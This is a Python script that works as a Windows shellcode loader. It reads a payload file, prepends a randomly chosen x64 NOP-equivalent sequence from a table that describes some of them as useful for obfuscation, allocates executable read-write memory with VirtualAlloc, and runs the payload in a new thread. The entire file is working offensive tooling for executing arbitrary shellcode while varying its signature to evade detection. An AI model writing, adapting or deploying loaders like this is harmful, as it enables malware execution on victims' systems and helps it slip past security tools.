import ctypes as kk
import random
import sys

x64_nops = {
    b"\x90": "NOP (single byte, standard NOP instruction)",
    b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
    b"\x0F\x1F\x00": "NOP DWORD PTR [RAX] (three-byte NOP, Intel recommended)",
    b"\x0F\x1F\x40\x00": "NOP DWORD PTR [RAX+0] (four-byte NOP)",
    b"\x0F\x1F\x44\x00\x00": "NOP DWORD PTR [RAX+RAX*1+0] (five-byte NOP)",
    b"\x0F\x1F\x80\x00\x00\x00\x00": "NOP QWORD PTR [RAX+0] (seven-byte NOP)",
    b"\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP QWORD PTR [RAX+RAX*1+0] (eight-byte NOP)",
    b"\x66\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP (nine-byte, long variant for alignment)",
    b"\x87\xDB": "XCHG EBX, EBX (register swap, acts as a NOP)",
    b"\x87\xC9": "XCHG ECX, ECX (similar to above, avoids altering execution)",
    b"\x8D\x49\x00": "LEA ECX, [RCX+0] (no-op using LEA instruction)",
    b"\x8D\x74\x26\x00": "LEA ESI, [RSI+0] (similar to above, useful for obfuscation)",
    b"\x48\x8D\x64\x24\x00": "LEA RSP, [RSP+0] (valid in x64, avoids register changes)",
    b"\x89\xC0": "MOV EAX, EAX (redundant move, acts as a NOP)",
    b"\x49\x89\xD1": "MOV R9, RDX (only acts as a NOP if R9 already equals RDX)",
    b"\x50\x58": "PUSH RAX / POP RAX (stack operation without effect, but touches stack)",
    b"\x53\x5B": "PUSH RBX / POP RBX (similar to above, but can affect shadow space)",
}

def O(shl_f):   

    with open(shl_f, 'rb') as f:
        shellcode_bytes = f.read()
    nopbytes, info = random.choice(list(x64_nops.items()))
    print(info)

    # for key in x64_nops: # all the NOPS lol
    #     nopbytes = nopbytes + key

    b_x = nopbytes + shellcode_bytes
    print("Trying NOP Type: ", info)
    kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
    kk.windll.kernel32.CreateThread.argtypes = (
        kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
    )

    spc = kk.windll.kernel32.VirtualAlloc(
        kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40)
    )
    bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
    kk.windll.kernel32.RtlMoveMemory(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
    hndl = kk.windll.kernel32.CreateThread(
        kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
        kk.pointer(kk.c_int(0))
    )
    kk.windll.kernel32.WaitForSingleObject(hndl, kk.c_uint32(0xffffffff))
if __name__ == "__main__":
    if len(sys.argv) != 2:
        shl_f = "msgbox.x64.bin"
        O(shl_f)
    else:
        shl_f = sys.argv[1]
        O(shl_f)